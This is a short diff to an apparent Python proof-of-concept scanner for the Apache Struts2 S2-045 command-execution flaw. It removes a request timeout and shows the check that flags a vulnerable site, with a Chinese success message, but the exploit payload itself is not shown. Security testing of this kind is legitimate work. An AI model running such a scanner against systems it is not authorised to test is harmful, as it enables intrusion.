@@ -50,7 +50,7 @@ class poc:
         data += char + "\n"
         data += "-----------------------------18012721719170"
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if payload in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞 (s2-045)\033[0m
